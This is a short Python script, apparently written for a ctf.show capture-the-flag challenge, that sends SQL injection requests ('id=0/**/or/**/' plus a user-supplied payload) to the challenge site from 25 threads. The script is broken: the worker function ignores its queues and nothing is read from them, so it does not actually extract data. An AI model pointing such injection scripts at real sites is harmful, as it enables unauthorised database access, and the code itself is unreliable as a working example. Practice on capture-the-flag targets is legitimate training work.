import requests
import queue
import threading
import warnings
warnings.filterwarnings("ignore")
word=""
end=int(input())
url = "https://ebf0be59-85f5-4005-acd9-0d931dfb4e8c.challenge.ctf.show/index.php?id=0/**/or/**/"
data=input()
def fun(result1,result2):
    reponse=requests.get(url+data)
result1=queue.Queue()
result2=queue.Queue()
for i in range(1,end):
    result1.put(i)
    result2.put(i)
for  i in range(1,26):
    t=threading.Thread(target=fun,args=(result1,result2))
    t.start()